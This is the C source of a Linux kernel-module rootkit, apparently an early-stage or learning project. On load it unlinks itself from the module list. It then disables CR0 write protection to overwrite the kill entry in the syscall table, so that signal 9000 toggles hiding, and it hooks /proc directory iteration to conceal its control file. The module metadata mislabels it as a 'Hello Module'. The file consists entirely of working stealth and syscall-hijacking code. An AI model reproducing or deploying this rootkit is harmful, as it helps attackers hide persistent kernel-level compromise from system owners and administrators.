#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/random.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>

#include "rootkit.h"

// Static variables

static u8 module_hidden = 0;

static struct list_head *module_list;

static struct proc_dir_entry *proc_rootkit;

// Vars for proc manipulation
static struct inode *proc_inode;
static const struct file_operations *orig_proc_fops;
static struct file_operations hacked_proc_fops;
struct dir_context *backup_ctx;

// Vars for syscall hijacking
static unsigned long *syscall_table;

static struct path proc_path;
typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
static sys_call_ptr_t original_kill;

// Module hiding

void module_hide(void)
{
    if (module_hidden)
        return;
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_unhide(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, module_list);
    module_hidden = 0;
}

// https://stackoverflow.com/a/60564037
static inline void force_write_cr0(unsigned long cr0)
{
    asm volatile("mov %0, %%cr0"
                 : "+r"(cr0), "+m"(__force_order));
}

static inline void disable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    force_write_cr0(cr0);
}

static inline void enable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    force_write_cr0(cr0);
}

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
{
    // pid_t pid = (pid_t)pt_regs->di;
    int sig = (int)pt_regs->si;

    switch (sig)
    {
    case 9000:
        if (module_hidden)
            module_unhide();
        else
            module_hide();
        break;
    default:
        return original_kill(pt_regs);
        break;
    }
    return 0;
}

// Proc file interface

static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
{
    pr_info("read handler\n");
    return 0;
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    pr_info("write handler\n");
    return -1;
}

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
                        loff_t off, u64 ino, unsigned int d_type)
{
    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = orig_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;
    return result;
}

static const struct file_operations proc_rootkit_fops = {
    .read = rk_proc_read,
    .write = rk_proc_write,
};

static int proc_init(void)
{
    // Create entry for controlling rootkit
    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUSR, NULL, &proc_rootkit_fops);
    if (!proc_rootkit)
        return -1;

    if (kern_path("/proc", 0, &proc_path))
        return -1;
    // Get inode of proc
    proc_inode = proc_path.dentry->d_inode;
    // Make copy of file ops and backup orig
    hacked_proc_fops = *proc_inode->i_fop;
    orig_proc_fops = proc_inode->i_fop;
    // Modify iterate_shared
    hacked_proc_fops.iterate_shared = rk_iterate_shared;
    // Change fops to hacked
    proc_inode->i_fop = &hacked_proc_fops;

    return 0;
}

static void proc_clean(void)
{
    if (proc_rootkit != NULL)
    {
        proc_remove(proc_rootkit);
        proc_rootkit = NULL;
    }

    if (kern_path("/proc", 0, &proc_path))
        return;
    proc_inode = proc_path.dentry->d_inode;
    proc_inode->i_fop = orig_proc_fops;
}

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init())
    {
        proc_clean();
        return 1;
    }

    module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    original_kill = (sys_call_ptr_t)syscall_table[__NR_kill];

    disable_write_protect();

    syscall_table[__NR_kill] = (unsigned long)hacked_kill;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();

    disable_write_protect();

    syscall_table[__NR_kill] = (unsigned long)original_kill;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_rootkit_init);
module_exit(lmk_rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thomas");
MODULE_DESCRIPTION("Hello Module");
MODULE_VERSION("0.0.1");